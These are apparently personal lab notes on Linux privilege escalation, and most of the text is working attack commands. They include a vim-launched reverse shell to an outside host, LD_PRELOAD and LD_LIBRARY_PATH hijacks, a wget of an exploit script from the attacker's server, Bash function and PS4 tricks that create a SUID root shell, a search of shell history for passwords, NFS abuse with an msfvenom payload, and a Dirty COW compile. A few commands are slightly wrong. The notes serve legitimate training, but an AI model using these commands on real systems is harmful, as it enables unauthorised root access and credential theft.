# Privesc on linux

IP=10.10.213.223

`openssl passwd new a`
`mkpasswd -m sha512 password`
`vim -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"`

`LD_PRELOAD` -> Loads a shared object before the program is run
`LD_LIBRARY_PATH` -> List of shared directories that are searched for first

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c 
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

```
ldd /usr/sbin/apache2
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```

find all SUID and SGID executables
`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

python's http server

First I launched a server using:
`python -c http.server 8080` which opens up an http server on port 8080
On the victim machine I then ran (after checking it successfully pinged)
`wget http:/$MY_IP:8080/exploit.sh`

Using `strace` to view how a task uses resources

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

runs an strace on the file and redirects stderr to stdout and uses grep regex to filter out given terms. I redirected this into a new file on the machine as output.txt

Bash versions less than 4.2 you can define function names that appear like paths:
`function /usr/sbin/service { /bin/bash -p; }; export /usr/sbin/service`
run the command asking for `service` or whatever and you now have priviledged access

Cheeky calls for debugging pre-Bash 4.4
`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Good practice to check history logs for accidental password input
`cat ~/.*history | less`
And then scan through it for passwords

Exploiting NFS
On your machine, login to root
`mkdir -p tmp/nfs`
`mount -o rw,vers=2 <Victim IP>:/tmp tmp/nfs`
`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o tmp/nfs/shell.elf`
`chmod +xs tmp/nfs/shell.elf`
On the victim machine
`./tmp/shell.elf`

Kernel exploits should be used as a last resort as they may destabilise the system
Check what exploits it is weak to
`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`
`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w`

